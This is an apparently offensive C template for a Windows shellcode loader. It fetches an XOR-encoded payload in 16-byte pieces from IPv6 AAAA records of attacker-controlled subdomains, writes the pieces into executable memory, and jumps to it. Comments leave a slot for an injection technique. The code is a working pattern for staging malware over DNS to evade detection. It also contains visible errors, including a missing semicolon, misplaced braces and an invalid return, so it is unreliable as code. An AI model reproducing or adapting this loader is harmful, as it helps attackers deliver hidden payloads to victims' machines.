#include <stdint.h>
#include <inttypes.h>
#include <winsock2.h>
#include <windns.h>
#include <windows.h>
#include <stdio.h>

typedef struct in6_addr {
  union {
    u_char Byte[16];
    u_short Word[8];
#ifdef __INSIDE_CYGWIN__
    uint32_t __s6_addr32[4];
#endif
  } u;
} IN6_ADDR, *PIN6_ADDR, *LPIN6_ADDR;

typedef uint8_t u_int8_t;
typedef uint16_t u_int16_t;
typedef uint32_t u_int32_t;


LPVOID *GetShellCodeAddress(){

  IN6_ADDR Ipv6address;
  PDNS_RECORD results;
  DNS_STATUS resp;
  int i;
  i = 0;
  int z;
  int x;
  z = 0;

  // Allocate Memory for our shellcode
  LPVOID allbuffer2 = VirtualAlloc(NULL, 0x1500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  // Save the original allocated memory for later use
  void *original_allbuffer2 = allbuffer2;
  printf("[+] allbuffer2 address is : %p\n", allbuffer2);
  printf("[+] original_allbuffer2 address is : %p\n", original_allbuffer2);

  // Pointer to the domain name for later use
  char *domain;

  while(TRUE){
    // Do some format string to write full domain with prefix and save the to domain
    asprintf(&domain, "{PREFIX}%i.{DOMAIN}", i);

    // Send IPV6 "AAAA" request to the domain
    resp = DnsQuery_A(domain, 0x001c, DNS_QUERY_STANDARD, NULL, &results, NULL);
    if(resp != 0){
      printf("[+] Error resolving host!\n");
      // Important break in case the domain is not resolvable
      // Also Important to know the last domain to call for
      break;
    }else{
      printf("[+] Host Resolved!\n");
    }

    // Save The IPV6 "Shellcode" chunck
    LPVOID Ipv6Address = &results->Data.AAAA.Ip6Address;

    // Write the shellcode bytes from Ipv6Address to the memory
    for (x = 0; x < 16 ; x++) {

        // Copy each byte from shellcode to TempByte after decoding it
        // In case there is no XOR encoding it will XOR to 0x00 which
        char TempByte = *((char *)Ipv6Address + x) ^ {KEY};

        // Copy the shellcode chunck to the previously allocated space.
        memcpy(allbuffer2 + z, &TempByte, 1);

        // Make sure to append to the next memory address inside the allocated space.
        z++;

}

// Increase domain prefix by 1 "Move to the other domain"
i++;

// Sleep based on user input
sleep({SLEEPTIME});
}
printf("[+] allbuffer2 address is : %p\n", allbuffer2);

return *allbuffer2;



}

int main(){

// Get Shellcode Address

LPVOID ShellcodeAddress = GetShellCodeAddress()

// Write your injection technique here
// And use ShellcodeAddress as your shellcode pointer

// Jump to shellcode
goto *ShellcodeAddress;


}
